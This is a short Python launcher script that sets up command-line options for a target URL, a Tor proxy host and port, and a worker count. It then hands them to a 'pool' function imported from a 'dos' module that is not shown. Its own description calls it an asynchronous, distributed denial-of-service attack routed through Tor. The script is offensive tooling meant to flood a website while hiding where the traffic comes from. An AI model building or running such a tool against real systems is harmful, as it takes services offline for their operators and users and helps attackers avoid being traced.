from argparse import ArgumentParser

from dos import URL, PROXY_HOST, PROXY_PORT, WORKERS, pool


if __name__ == '__main__':
    parser = ArgumentParser(description='Asynchronous and distributed DOS attack through TOR.')

    parser.add_argument(
        '--url',
        default=URL,
        type=str
    )

    parser.add_argument(
        '--proxy_host',
        default=PROXY_HOST,
        type=str
    )

    parser.add_argument(
        '--proxy_port',
        default=PROXY_PORT,
        type=int
    )

    parser.add_argument(
        '--workers',
        default=WORKERS,
        type=int
    )

    pool(parser.parse_args())
